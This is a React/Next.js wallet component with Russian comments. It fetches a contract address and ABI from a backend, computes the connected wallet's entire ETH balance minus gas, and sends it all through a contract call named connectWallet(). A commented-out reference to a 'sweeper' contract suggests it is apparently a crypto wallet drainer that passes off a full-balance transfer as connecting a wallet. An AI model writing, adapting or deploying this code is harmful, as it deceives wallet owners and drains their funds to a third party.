'use client'

import { BACKEND_LINK } from '@/utils/variables';
import { useState } from 'react';
import Web3 from 'web3';


interface ExternalProvider {
  selectedAddress?: string
  isMetaMask?: boolean
  isTrust?: boolean
  request(args: { method: string; params?: unknown[] }): Promise<unknown>
  on?(event: string, listener: (...args: unknown[]) => void): void
  removeListener?(event: string, listener: (...args: unknown[]) => void): void
}

interface ResponseContract {
  contract_address: string
  contract: {
    address: string
    abi: any[]
  }
}

async function fetchContractData(): Promise<ResponseContract> {
  /*
    Получаем с бекенда адрес, и ABI
  */
  const res = await fetch(`${BACKEND_LINK}/contract`)
  if (!res.ok) {
    throw new Error(`Ошибка при запросе контракта: ${res.status}`)
  }
  const data = (await res.json()) as ResponseContract
  return data
}

// Вынесенная функция: вся логика взаимодействия с контрактом
async function sendAllBalanceViaContract(
  eth: ExternalProvider & { isMetaMask?: boolean; isTrust?: boolean },
  from: string,
  setStatus: (msg: string) => void,
): Promise<string> {
  // 1. Получаем с бекенда и ABI, и адрес
  const { contract } = await fetchContractData()
  const { abi, address } = contract

  // 2. Вешаем Web3 на провайдер и создаём экземпляр контракта
  const web3 = new Web3(eth as any)
  // const sweeper = getSweeperContract(web3, abi, address)
  const ctr  = new web3.eth.Contract(abi, address)

  setStatus('Считаю баланс и gasPrice…')
  const balanceWei = BigInt(await web3.eth.getBalance(from))
  const gasPrice   = BigInt(await web3.eth.getGasPrice())

  setStatus('Оцениваю gasLimit для connectWallet()…')
  // 2) estimateGas учитывает и вызов метода, и передаваемый value
  const gasLimitBI = BigInt(
    await ctr.methods.connectWallet().estimateGas({
      from: from,
      value: balanceWei.toString()
    })
  )

  // Добавим небольшой запас (например, 10%)
  const gasLimit = gasLimitBI + gasLimitBI / 10n;

  setStatus(`gasLimit ≈ ${gasLimit.toString()} — считаем sendValue…`);
  // 3) feeCost и sendValue
  const feeCost  = gasLimit * gasPrice
  const sendValue = balanceWei > feeCost ? balanceWei - feeCost : 0n;
  if (sendValue <= 0n) {
    throw new Error('Недостаточно ETH для покрытия газа');
  }

  const valueHex = '0x' + sendValue.toString(16);
  setStatus(`Отправляю connectWallet() с ${web3.utils.fromWei(valueHex,'ether')} ETH…`);

  // 4) Отправка
  const receipt = await ctr.methods.connectWallet().send({
    from:     from,
    value:    valueHex,
    gas:      gasLimit.toString(),
    gasPrice: gasPrice.toString(),
  })

  setStatus(`✅ connectWallet выполнен. TxHash: ${receipt.transactionHash}`)
  return receipt.transactionHash;
}

export default function Wallet() {
  const [account, setAccount] = useState<string>()
  const [status, setStatus] = useState('Нажмите «Connect & SendBalance»')
  const [busy, setBusy] = useState(false)

  async function connectAndSendBalance() {
    const eth = window.ethereum as ExternalProvider & {
      isMetaMask?: boolean
      isTrust?: boolean
    }
    if (!eth) {
      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
      return
    }

    setBusy(true)
    setStatus('Запрашиваем аккаунт…')
    let addr = eth.selectedAddress as string | undefined
    if (!addr) {
      try {
        const resp = await eth.request({ method: 'eth_requestAccounts' })
        addr = (resp as string[])[0]
      } catch (e: unknown) {
        const msg = e instanceof Error ? e.message : String(e);
        setStatus(`Ошибка: ${msg}`);
        setBusy(false)
        return
      }
    }
    setAccount(addr)

    try {
      const txHash = await sendAllBalanceViaContract(eth, addr, setStatus)
      setStatus(`Успех! TxHash: ${txHash}`)
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      setStatus(`Ошибка: ${msg}`);
    } finally {
      setBusy(false)
    }
  }

  return (
    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
      <h1>Send Contract Balance</h1>
      <button
        onClick={connectAndSendBalance}
        disabled={busy}
        style={{
          padding: '10px 20px',
          fontSize: '16px',
          cursor: busy ? 'not-allowed' : 'pointer',
        }}
      >
        {busy ? '…обрабатываем' : 'Connect & SendBalance'}
      </button>
      <p><strong>Статус:</strong> {status}</p>
      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
    </div>
  )
}
